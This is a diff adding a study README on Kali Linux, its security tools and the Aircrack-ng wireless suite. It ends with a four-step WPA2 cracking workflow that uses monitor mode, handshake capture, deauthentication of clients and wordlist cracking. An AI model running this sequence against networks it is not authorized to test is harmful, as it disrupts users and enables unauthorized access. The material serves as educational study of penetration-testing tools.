@@ -1,0 +1,89 @@
+# 🐉 Kali Linux - Advanced Penetration Testing & Security Auditing OS
+
+## 📌 Objective
+To study Kali Linux and its wide array of penetration testing, forensic, and reverse engineering tools, with a focus on wireless assessments using the **Aircrack-ng suite**.
+
+---
+
+## 🐧 What is Kali Linux?
+
+Kali Linux is a **Debian-based Linux distribution** designed specifically for:
+
+- Penetration Testing
+- Digital Forensics
+- Security Research
+- Reverse Engineering
+
+It is developed and maintained by **Offensive Security** and is a complete rebuild of the earlier BackTrack Linux.
+
+---
+
+## 🌟 Key Features
+
+- ✅ 600+ Pre-installed Security Tools
+- ✅ Free and Open Source (FOSS)
+- ✅ Open-source Git Tree – Fully customizable
+- ✅ FHS Compliant
+- ✅ Secure Development Environment (GPG signed packages)
+- ✅ Wide Wireless Device Support
+- ✅ Kernel patched for packet injection
+- ✅ Multilingual Support
+- ✅ ARM Support (Raspberry Pi, BeagleBone, etc.)
+
+---
+
+## 🛠️ Top Security Tools in Kali Linux
+
+| Tool                 | Purpose                                 |
+|----------------------|------------------------------------------|
+| `Nmap`              | Network scanning & host discovery        |
+| `Aircrack-ng`       | Wireless password cracking               |
+| `Kismet`            | Wireless network detector/sniffer        |
+| `Wireshark`         | Packet analyzer                          |
+| `Metasploit`        | Exploitation framework                   |
+| `Burp Suite`        | Web application security testing         |
+| `John the Ripper`   | Password cracking                        |
+| `Social Eng. Toolkit` | Social engineering simulation         |
+| `Airodump-ng`       | Captures Wi-Fi packets                   |
+
+---
+
+## 📡 Aircrack-ng Suite
+
+The **Aircrack-ng** suite is one of the most powerful wireless network auditing tools.
+
+### 🧩 Components
+
+#### 📍 Monitoring
+
+- **Airodump-ng** – Capture raw 802.11 frames and export to `.cap` files
+- **Airmon-ng** – Enable monitor mode on a wireless card
+
+#### 🧨 Attacking
+
+- **Aireplay-ng** – Packet injection, de-authentication, fake AP, replay attacks
+
+#### 🔍 Testing
+
+- **airmon-ng check** – Tests WiFi adapter injection and compatibility
+
+#### 🔓 Cracking
+
+- **Aircrack-ng** – Crack WEP, WPA, WPA2-PSK passwords using captured handshake files
+
+---
+
+## 🔧 Example Workflow (WPA2 Crack - Aircrack-ng)
+
+```bash
+# 1. Enable monitor mode
+sudo airmon-ng start wlan0
+
+# 2. Capture handshake
+sudo airodump-ng wlan0mon --bssid <target-BSSID> -c <channel> -w capture
+
+# 3. Perform deauth to get handshake
+sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon
+
+# 4. Crack with wordlist
+aircrack-ng -w wordlist.txt capture.cap
